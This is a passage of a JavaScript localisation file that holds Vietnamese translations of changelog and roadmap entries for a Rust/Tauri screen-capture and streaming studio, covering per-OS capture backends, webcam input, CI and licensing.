vi","changelog.52f9e72e5682":"<strong>Media</strong> (tệp video) được <strong>gộp vào giai đoạn ghi hình</strong> (quyết định ngày 2026-07-02): nó dựa trên kiến trúc codec truyền tải / giải mã phần cứng (ffmpeg tải theo yêu cầu) — không có bộ giải mã video đa dụng nào viết thuần bằng Rust, và các bản giả lập (stub) là trái với điều lệ.","changelog.9f015d62a029":"<strong>Nguồn trình duyệt</strong> chuyển sang giai đoạn phát trực tiếp chuyên sâu, chờ sau một <strong>bản thử nghiệm thiết kế webview ngoài màn hình</strong> (Tauri v2 không thể kết xuất một webview vào texture trên mọi nền tảng).","changelog.fb9378d724c2":"<strong>Văn bản CJK</strong> tạm thời dùng phông hệ thống — Noto CJK (~100 MB) không được đóng gói kèm; bộ phông đi kèm bao gồm Latin/Hy Lạp/Kirin + Ả Rập + Do Thái.","changelog.30f499446f84":"Tư thế bảo mật không thay đổi: khung hình chương trình đã dựng ở lại <strong>trong tiến trình</strong> phía sau scheme <code>preview://</code> có CORS được ghim; tệp duy nhất mà studio ghi là bộ sưu tập cảnh cục bộ. Các phụ thuộc bên thứ ba mới (dùng runtime <code>wgpu</code>, <code>image</code>, <code>tiny-skia</code>, <code>fontdb</code>, <code>unicode-bidi</code>, <code>pollster</code>) đều có giấy phép dễ dãi và được ghi trong <code>THIRD-PARTY-NOTICES.md</code>.","changelog.19084c726e61":"[0.25.0] — 2026-07-01 (Lõi ghi hình)","changelog.a7a34cfb1a75":"<strong>Ghi màn hình &amp; cửa sổ theo từng hệ điều hành</strong> phía sau giao diện <code>fcap-capture</code> tự sở hữu, tạo ra các khung hình có dấu thời gian, tải lên GPU được, qua một kênh kiểu bản mới nhất thắng với số khung hình bị rớt được đếm trung thực:","changelog.871ef2f6ec64":"<strong>Windows</strong> — DXGI Desktop Duplication cho màn hình (có hòa trộn con trỏ chuột; bản nhân bản không chứa con trỏ) và <strong>Windows.Graphics.Capture</strong> cho từng cửa sổ riêng lẻ (Windows 10 1903+), chịu được việc chuyển chế độ hiển thị và đổi kích thước cửa sổ.","changelog.6beba9cca1b5":"<strong>macOS</strong> — <strong>ScreenCaptureKit</strong> (màn hình + cửa sổ, macOS 12.3+); quyền Ghi màn hình được yêu cầu ngay từ đầu, và nếu bị từ chối sẽ hiện liên kết sâu <strong>Mở cài đặt Ghi màn hình</strong> thay vì một khung hình đen câm lặng. (Mức tối thiểu của gói được nâng từ 12.0 → 12.3 — ScreenCaptureKit không tồn tại dưới 12.3.)","changelog.181ee179e017":"<strong>Linux</strong> — <strong>portal ScreenCast</strong> (<code>ashpd</code> → PipeWire) trên Wayland, nơi <em>hộp thoại hệ thống</em> chọn màn hình hoặc cửa sổ (kiểu ghi hình duy nhất mà Wayland cho phép — bộ chọn nói thẳng điều đó), cùng một đường <strong>X11</strong> trực tiếp (màn hình + cửa sổ <code>_NET_CLIENT_LIST</code>) trên các phiên X.","changelog.2c3347e661da":"Nguồn <strong>Webcam / card ghi hình</strong> qua <code>nokhwa</code> (Media Foundation / AVFoundation / V4L2): liệt kê thiết bị, liệt kê định dạng theo từng thiết bị (độ phân giải / fps / định dạng truyền tải), khung hình RGBA trực tiếp, và luồng cấp quyền camera trên macOS (đóng gói kèm <code>NSCameraUsageDescription</code>).","changelog.eb1065b2fc17":"<strong>Bản xem trước chương trình trực tiếp</strong>: nút “+” của thanh Nguồn giờ đã hoạt động — các bộ chọn Chụp Màn hình, Chụp Cửa sổ và Thiết bị ghi video; nguồn được chọn hiển thị trực tiếp trong bản xem trước chương trình với lớp phủ nhãn / độ phân giải / fps đo được / khung hình bị rớt. Đường dẫn nằm hoàn toàn trong tiến trình từ đầu đến cuối (ghi hình → JPEG → scheme <code>preview://</code> riêng của ứng dụng → canvas) — khung hình không bao giờ chạm tới socket hay đĩa. Vẽ trực tiếp chứng minh đường dẫn hoạt động; bộ ghép hình wgpu tiếp quản từ 0.40.0.","changelog.e3fc6c640b84":"<strong>Kiểm thử khói trên phần cứng thật</strong> (giữ ở trạng thái <code>--ignored</code> trên CI không màn hình): ghi màn hình, cửa sổ và webcam được xác minh với khung hình thật trên phần cứng thật.","changelog.c326134a5d1e":"Khung hình xem trước ở lại <strong>trong tiến trình</strong> (một scheme URI tùy chỉnh — không socket localhost, không tệp tạm); tư thế bảo mật không thay đổi: không có lệnh gọi mạng ra ngoài nào, không tài khoản, không thu thập dữ liệu sử dụng.","changelog.38a90eaf4fce":"Việc hệ điều hành từ chối quyền (Ghi màn hình / Camera trên macOS) được hiển thị trung thực kèm liên kết sâu tới cài đặt.","changelog.c6a63e383dbf":"Thông báo bên thứ ba mới: <code>pipewire</code> + <code>x11rb</code> (ghi hình trên Linux) và <code>mozjpeg</code> (giải mã MJPEG của webcam) + <code>jpeg-encoder</code> (mã hóa bản xem trước) — hai thư viện sau mang giấy phép <strong>IJG</strong>, nay đã được ghi nhận trong <code>THIRD-PARTY-NOTICES.md</code> và được cho phép trong <code>deny.toml</code>.","changelog.2f1e03606026":"[0.10.0] — 2026-07-01 (Nền tảng &amp; kho mã)","changelog.4648ce7198c9":"Giao diện điều khiển <strong>Tauri v2 + React 19 / TypeScript / Vite 7 / Tailwind 4</strong> (Havoc dark) trên một workspace Cargo Rust: crate ứng dụng <code>freally-capture</code> + các crate bộ máy <code>fcap-*</code> tự sở hữu (<code>capture</code>, <code>sources</code>, <code>compositor</code>, <code>scene</code>, <code>audio</code>, <code>encode</code>, <code>stream</code>), tất cả đều <code>#![forbid(unsafe_code)]</code>.","changelog.b146fa224118":"<strong>Bố cục dock của studio</strong> (bản xem trước chương trình lớn, thanh Cảnh/Nguồn, Bàn trộn âm thanh, Điều khiển, Thống kê) với trạng thái chưa triển khai được nói rõ trung thực trên mọi điều khiển.","changelog.6b08ed4da71e":"<strong>Cầu nối giao diện ↔ lõi có kiểu</strong>: <code>health()</code> (phiên bản ứng dụng + các crate lõi được liên kết), <code>settings_get</code>/<code>settings_set</code>, và một sự kiện đẩy <code>stats</code> ~2 Hz được hiển thị trực tiếp trong dock thống kê (dữ liệu giữ chỗ, được ghi nhãn như vậy cho đến khi có lấy mẫu thật ở 0.70.0).","changelog.29f30cb39613":"<strong>Kho cài đặt</strong>: JSON trong thư mục cấu hình của hệ điều hành, ghi nguyên tử bằng tệp tạm + đổi tên, có phương án dự phòng khi tệp hỏng/thiếu; nút bật/tắt dock thống kê được lưu qua các lần chạy.","changelog.68352e507bf1":"<strong>Ma trận CI</strong> (Windows/macOS/Linux): rustfmt, clippy <code>-D warnings</code>, kiểm thử, cargo-deny + cargo-audit, prettier/eslint/tsc/vitest/build cho giao diện, và các bản dựng debug Tauri theo từng hệ điều hành; một <strong>quy trình phát hành</strong> kích hoạt bằng tag (trình cài đặt theo từng hệ điều hành → bản nháp GitHub Release).","changelog.77fbaa6cd383":"<code>LICENSE</code> độc quyền + các tài liệu quản trị và trang GitHub Pages <code>docs/</code> khởi đầu với biểu tượng huy hiệu true-alpha.","changelog.b36a760b89c7":"<strong>Đã xác minh bản phát hành Windows</strong>: ứng dụng GUI <strong>không có cửa sổ console</strong> (đã kiểm tra trên tệp nhị phân đã build); trình cài đặt MSI + NSIS build được.","changelog.5da8006aa5c6":"<strong>Không có lệnh gọi mạng ra ngoài nào</strong> trong ứng dụng; CSP nghiêm ngặt; chỉ có quyền tối thiểu <code>core:default</code>; khóa phát/thông tin bí mật không được lưu (hiện chưa có); <strong>không có AI/ML ở bất kỳ đâu</strong> (điều lệ).","changelog.62e65d7911da":"Dự kiến — 0.25.0 (Lõi ghi hình)","changelog.216d50682cb6":"Ghi màn hình/cửa sổ theo từng hệ điều hành (Windows DXGI + Windows.Graphics.Capture; macOS ScreenCaptureKit; Linux portal PipeWire + X11) phía sau một giao diện <code>Capture</code>.","changelog.22b2b1c3d027":"Đầu vào webcam / card ghi hình qua <code>nokhwa</code>; bản xem trước chương trình trực tiếp.","changelog.8716e909baa8":"Dự kiến — 0.40.0 (Bộ ghép hình + cảnh/nguồn)","changelog.42125f1329d8":"Bộ ghép hình GPU <code>wgpu</code> tự sở hữu: biến đổi/cắt/co giãn/xoay theo từng nguồn, chế độ hòa trộn, và chuỗi bộ lọc video (khóa chroma, hiệu chỉnh màu, LUT, làm mờ, mặt nạ, làm nét, cuộn).","changelog.5e0cc21c74cc":"Mô hình dữ liệu cảnh/nguồn/bộ lọc tự sở hữu; bộ nguồn đầy đủ (ảnh, văn bản, màu, media, trình duyệt); thanh Cảnh + Nguồn với tay nắm biến đổi trên khung vẽ.","changelog.25af1c9ae9bd":"Dự kiến — 0.55.0 (Bàn trộn âm thanh + ghi hình)","changelog.c33ce0f2f787":"Đồ thị âm thanh <code>cpal</code>: âm lượng/tắt tiếng/giám sát theo từng nguồn, tối đa 6 rãnh, độ lệch đồng bộ, ducking, nhấn để nói, đồng hồ LUFS, và bộ lọc (khử ồn DSP cổ điển tự sở hữu — không ML — cùng cổng nhiễu, bộ nén, bộ giới hạn, EQ, khuếch đại).","changelog.e1afeb62fe94":"Ghi nhiều rãnh qua bộ mã hóa phần cứng (NVENC/Quick Sync/AMF/VAAPI/VideoToolbox) + dự phòng x264, cùng codec không mất dữ liệu <code>freally-video</code> tự sở hữu; vùng chứa mp4/mkv/mov/webm; chia tệp; bản sao cục bộ theo rãnh riêng. Các codec truyền tải vướng bằng sáng chế đi qua cầu nối ffmpeg tải theo yêu cầu, có xác minh hash.","changelog.b03b02234da0":"Dự kiến — 0.70.0 (Studio MVP — bản công khai đầu tiên)","changelog.2f588cc01f93":"Phát trực tiếp tới một đích (RTMP/RTMPS) lên Twitch/YouTube/Kick/Facebook/Trovo/tùy chỉnh, có tự động kết nối lại và độ trễ luồng phát; bản ghi chính tiếp tục bất kể trạng thái phát.","changelog.8591c913ffa0":"Chế độ Studio (xem trước/chương trình) + chuyển cảnh (cắt/mờ dần/trượt/quét/stinger/luma-wipe); camera ảo (theo từng hệ điều hành); phím tắt toàn cục; hồ sơ + bộ sưu tập cảnh; dock thống kê. <strong>Bản dựng công khai đầu tiên — hoàn toàn miễn phí, như mọi ứng dụng Freally.</strong>","changelog.ae9d61fc4bdf":"Dự kiến — 0.85.0 (Đa luồng / SRT / WHIP + chiều sâu cho cảnh/nguồn/bộ mã hóa)","changelog.384e7dfb96e1":"Phát đồng thời nhiều luồng tới nhiều đích, thẳng tới từng nền tảng; giao thức SRT và WHIP; đầu ra khung vẽ dọc/nhiều khung vẽ.","changelog.0cb0b6d267f0":"Bộ đệm phát lại cuộn với các cấu hình sẵn; cảnh lồng nhau, nhóm nguồn + âm thanh theo từng cảnh; nguồn trình chiếu ảnh + cấu hình sẵn cho card ghi hình; bộ lọc khóa màu/khóa độ sáng + trễ kết xuất; đầu ra FPS cao/4K, xử lý không gian màu + thu nhỏ đầu ra; đánh dấu luồng phát phía bản ghi; chiều sâu camera ảo (nguồn đơn lẻ + âm thanh); gói stinger + luma cao cấp; bộ lọc nâng cao.","changelog.060db9595543":"Dự kiến — 1.0.0 (API điều khiển từ xa, script, ghi trò chơi &amp; ra mắt)","changelog.26a3256fb4c7":"API điều khiển từ xa qua WebSocket (kiểu Stream Deck / Companion) + dock trình duyệt; script Lua/JS + SDK plugin.","changelog.bde34ffd89b3":"Ghi trò chơi (hook API GPU DX/GL/Vulkan, được gắn cờ trung thực); NDI + VST tùy chọn.","changelog.fdf05cb85cbf":"Trình cài đặt có chữ ký/được công chứng (Win MSI/NSIS, macOS .app/.dmg + plugin camera ảo, Linux AppImage/.deb/.rpm/Flatpak) + tự động cập nhật tự lưu trữ.","changelog.28cee61c3ca1":"Trợ năng (ưu tiên bàn phím, có nhãn cho trình đọc màn hình, độ tương phản cao) và bản địa hóa giao diện sang 18 ngôn ngữ (<code>ar de en es fr hi id it ja ko nl pl pt-BR ru tr uk vi zh-CN</code>, tiếng Anh trước tiên, tiếng Ả Rập RTL); hướng dẫn ban đầu + mẫu."}; for (var k in add) mine[k] = add[k]; })(window.CAPTURE_I18N = window.CAPTURE_I18N || {});
